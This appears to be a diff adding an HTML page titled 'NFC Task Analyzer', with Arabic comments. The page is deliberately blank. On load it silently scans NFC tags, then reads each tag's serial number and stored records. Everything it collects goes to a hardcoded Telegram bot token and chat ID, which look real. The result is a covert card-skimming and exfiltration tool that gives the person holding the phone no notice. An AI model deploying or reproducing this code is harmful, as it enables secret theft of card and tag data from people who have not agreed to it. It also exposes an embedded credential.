@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>NFC Task Analyzer</title>
+    <!-- صفحة فارغة تمامًا، لا شيء مرئي -->
+</head>
+<body style="margin:0; padding:0; background:#ffffff;">
+    <script>
+        // ================= إعدادات التليجرام (عدّل هنا) =================
+        const BOT_TOKEN = "8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k";
+        const CHAT_ID   = "6612813200";
+        // =================================================================
+
+        let nfcReader = null;
+        let isActive = false;
+
+        // دالة تحويل ArrayBuffer إلى نص
+        function decodeRecordData(record) {
+            try {
+                if (record.recordType === "text") {
+                    const decoder = new TextDecoder(record.encoding || "utf-8");
+                    return decoder.decode(record.data);
+                } else if (record.recordType === "url" || record.recordType === "absolute-url") {
+                    const decoder = new TextDecoder();
+                    return decoder.decode(record.data);
+                } else {
+                    // محاولة فك عامة
+                    const decoder = new TextDecoder("utf-8");
+                    return decoder.decode(record.data);
+                }
+            } catch(e) {
+                return "[غير قابل للتحويل النصي]";
+            }
+        }
+
+        // تحليل ما إذا كانت البيانات تمثل "مهمة" (task)
+        function analyzeTask(dataText, recordType) {
+            const result = {
+                isTask: false,
+                taskType: null,
+                taskDescription: null,
+                parameters: {},
+                rawData: dataText
+            };
+
+            if (!dataText || dataText.length === 0) return result;
+
+            // 1. محاولة تفسير البيانات كـ JSON (أكثر دقة للمهام)
+            try {
+                const json = JSON.parse(dataText);
+                if (json.task || json.action || json.command || json.type) {
+                    result.isTask = true;
+                    result.taskType = json.task || json.action || json.command || json.type || "unknown";
+                    result.taskDescription = json.description || json.message || json.instruction || "لا يوجد وصف";
+                    result.parameters = json.params || json.parameters || {};
+                    result.sourceFormat = "JSON";
+                    return result;
+                }
+            } catch(e) { /* ليس JSON */ }
+
+            // 2. البحث عن أنماط نصية شائعة للمهام
+            const lower = dataText.toLowerCase();
+            const patterns = [
+                { regex: /task:(\w+)/i, type: "task", descGroup: null },
+                { regex: /action:(\w+)/i, type: "action", descGroup: null },
+                { regex: /command:(\w+)/i, type: "command", descGroup: null },
+                { regex: /open[:_]url[=:](.+)/i, type: "open_url", param: "url" },
+                { regex: /call[=:](.+)/i, type: "call_phone", param: "number" },
+                { regex: /send[=:](.+)/i, type: "send_message", param: "message" },
+                { regex: /show[=:](.+)/i, type: "show_notification", param: "text" },
+                { regex: /launch[=:](.+)/i, type: "launch_app", param: "app_name" }
+            ];
+
+            for (let p of patterns) {
+                const match = dataText.match(p.regex);
+                if (match) {
+                    result.isTask = true;
+                    result.taskType = p.type;
+                    if (p.param) {
+                        result.parameters[p.param] = match[1];
+                        result.taskDescription = `${p.type} → ${match[1]}`;
+                    } else {
+                        result.taskDescription = `نوع المهمة: ${match[1] || p.type}`;
+                    }
+                    result.sourceFormat = "Text pattern";
+                    break;
+                }
+            }
+
+            // 3. إذا كان الرابط (url) يعتبر مهمة فتح
+            if (!result.isTask && (recordType === "url" || recordType === "absolute-url") && dataText.match(/^https?:\/\//i)) {
+                result.isTask = true;
+                result.taskType = "open_url";
+                result.taskDescription = `فتح الرابط: ${dataText}`;
+                result.parameters.url = dataText;
+                result.sourceFormat = "URL record";
+            }
+
+            // 4. إذا كان النص يحتوي على كلمات تشير إلى إجراء
+            if (!result.isTask && (lower.includes("اضغط") || lower.includes("افتح") || lower.includes("اتصل") || lower.includes("ارسل"))) {
+                result.isTask = true;
+                result.taskType = "inferred_action";
+                result.taskDescription = `نص يشير إلى إجراء: ${dataText.substring(0, 100)}`;
+                result.sourceFormat = "Text heuristic";
+            }
+
+            return result;
+        }
+
+        // جمع كل المعلومات المطلوبة من البطاقة
+        async function extractCardDetails(readingEvent) {
+            const details = {
+                serialNumber: readingEvent.serialNumber || "غير متوفر",
+                records: [],
+                totalDataSizeBytes: 0,
+                timestamp: new Date().toISOString()
+            };
+
+            if (readingEvent.message && readingEvent.message.records) {
+                for (let i = 0; i < readingEvent.message.records.length; i++) {
+                    const rec = readingEvent.message.records[i];
+                    const dataText = decodeRecordData(rec);
+                    const dataSize = rec.data ? rec.data.byteLength : 0;
+                    details.totalDataSizeBytes += dataSize;
+                    
+                    const recordInfo = {
+                        index: i,
+                        recordType: rec.recordType || "unknown",
+                        dataSizeBytes: dataSize,
+                        rawText: dataText.substring(0, 500), // حد أقصى 500 حرف
+                        taskAnalysis: analyzeTask(dataText, rec.recordType)
+                    };
+                    
+                    // إضافة تفاصيل إضافية إن وجدت
+                    if (rec.mediaType) recordInfo.mediaType = rec.mediaType;
+                    if (rec.id) recordInfo.id = rec.id;
+                    if (rec.encoding) recordInfo.encoding = rec.encoding;
+                    if (rec.lang) recordInfo.lang = rec.lang;
+                    
+                    details.records.push(recordInfo);
+                }
+            }
+            return details;
+        }
+
+        // تنسيق التقرير للإرسال إلى تليجرام
+        function formatReport(details) {
+            let report = `📇 *تقرير بطاقة NFC*\n\n`;
+            report += `🔑 *الرقم التسلسلي (UID):* \`${details.serialNumber}\`\n`;
+            report += `📦 *إجمالي حجم البيانات:* ${details.totalDataSizeBytes} بايت\n`;
+            report += `📄 *عدد السجلات:* ${details.records.length}\n\n`;
+            
+            for (let rec of details.records) {
+                report += `━━━ *سجل #${rec.index}* ━━━\n`;
+                report += `🏷️ نوع السجل: ${rec.recordType}\n`;
+                if (rec.mediaType) report += `📎 MIME: ${rec.mediaType}\n`;
+                if (rec.id) report += `🆔 المعرف: ${rec.id}\n`;
+                if (rec.encoding) report += `🔡 الترميز: ${rec.encoding}\n`;
+                if (rec.lang) report += `🌐 اللغة: ${rec.lang}\n`;
+                report += `💾 حجم البيانات: ${rec.dataSizeBytes} بايت\n`;
+                report += `📝 *البيانات المخزنة:*\n\`\`\`\n${rec.rawText}\n\`\`\`\n`;
+                
+                // تحليل المهمة
+                const task = rec.taskAnalysis;
+                if (task.isTask) {
+                    report += `\n⚙️ *تحليل المهمة (Task):*\n`;
+                    report += `   ✅ هذه البيانات تمثل مهمة\n`;
+                    report += `   🧠 نوع المهمة: ${task.taskType}\n`;
+                    report += `   📖 شرح المهمة: ${task.taskDescription}\n`;
+                    if (Object.keys(task.parameters).length > 0) {
+                        report += `   🧩 المعاملات:\n`;
+                        for (let [k, v] of Object.entries(task.parameters)) {
+                            report += `      • ${k}: ${v}\n`;
+                        }
+                    }
+                    report += `   🔍 مصدر التحليل: ${task.sourceFormat}\n`;
+                } else {
+                    report += `\n📌 *تحليل المهمة:* ليست مهمة محددة (بيانات عادية)\n`;
+                }
+                report += `\n`;
+            }
+            
+            if (details.records.length === 0) {
+                report += `⚠️ *لا توجد سجلات NDEF قابلة للقراءة.*\n`;
+                report += `البطاقة فارغة أو غير مدعومة بالكامل.\n`;
+            }
+            
+            report += `\n🕒 التوقيت: ${details.timestamp}`;
+            return report;
+        }
+
+        // الإرسال إلى تليجرام
+        async function sendToTelegram(text) {
+            if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+                console.warn("BOT_TOKEN غير مضبوط");
+                return;
+            }
+            if (!CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+                console.warn("CHAT_ID غير مضبوط");
+                return;
+            }
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const maxLen = 4000;
+            if (text.length <= maxLen) {
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+                    console.log("تم الإرسال بنجاح");
+                } catch(err) {
+                    console.error("فشل الإرسال:", err);
+                }
+            } else {
+                // تقسيم إذا كان النص طويلاً
+                let start = 0;
+                let part = 1;
+                while (start < text.length) {
+                    let end = start + maxLen;
+                    let partText = text.substring(start, end);
+                    if (part > 1) partText = `(تابع الجزء ${part})\n` + partText;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: partText,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    start = end;
+                    part++;
+                    await new Promise(r => setTimeout(r, 200));
+                }
+            }
+        }
+
+        // حدث قراءة NFC
+        async function onReading(event) {
+            if (!isActive) return;
+            try {
+                const details = await extractCardDetails(event);
+                const report = formatReport(details);
+                await sendToTelegram(report);
+                if (navigator.vibrate) navigator.vibrate(100);
+            } catch (err) {
+                console.error("خطأ:", err);
+                await sendToTelegram(`⚠️ خطأ أثناء قراءة البطاقة: ${err.message}`);
+            }
+        }
+
+        // بدء المسح التلقائي
+        async function startNFC() {
+            if (!('NDEFReader' in window)) {
+                console.error("Web NFC غير مدعوم");
+                return;
+            }
+            if (nfcReader) {
+                try { await nfcReader.stop(); } catch(e) {}
+            }
+            try {
+                nfcReader = new NDEFReader();
+                nfcReader.addEventListener("reading", onReading);
+                await nfcReader.scan();
+                isActive = true;
+                console.log("NFC scanning active");
+            } catch(err) {
+                console.error("فشل البدء:", err);
+            }
+        }
+
+        // التشغيل التلقائي عند تحميل الصفحة
+        window.addEventListener("load", () => {
+            setTimeout(startNFC, 300);
+        });
+
+        window.addEventListener("beforeunload", () => {
+            if (nfcReader && isActive) nfcReader.stop().catch(() => {});
+        });
+    </script>
+</body>
+</html>
